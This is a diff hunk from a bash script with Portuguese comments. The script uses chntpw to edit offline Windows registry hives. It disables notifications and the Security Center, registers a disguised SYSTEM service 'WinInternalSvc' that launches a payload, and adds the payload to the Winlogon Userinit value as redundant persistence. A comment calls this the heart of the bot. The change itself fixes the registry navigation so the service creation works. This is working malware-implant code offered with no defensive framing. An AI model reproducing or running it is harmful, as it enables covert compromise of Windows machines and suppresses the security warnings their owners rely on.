@@ -52,8 +52,9 @@ echo "[*] Desativando notificações e Central de Segurança..."
 printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseActionCenterExperience\ned UseActionCenterExperience\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
 
 # 6. PERSISTÊNCIA SYSTEM (O Coração do Bot)
-echo "[+] Criando serviço nativo de nível SYSTEM..."
-printf "cd ControlSet001\\\\Services\nnewkey WinInternalSvc\ncd WinInternalSvc\nnv 4 Start\ned Start\n2\nnv 4 Type\ned Type\n16\nnv 1 ImagePath\ned ImagePath\n$PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
+echo "[*] Criando Serviço SYSTEM via 'nk'..."
+# Navega passo a passo para evitar erro de 'Key not found'
+printf "cd ControlSet001\ncd Services\nnk WinInternalSvc\ncd WinInternalSvc\nnv 4 Start\n ed Start\n 2 \n nv 4 Type\n ed Type \n 16\n nv 1 ImagePath \n ed ImagePath \n$PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
 
 # Userinit como redundância
 printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start $PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
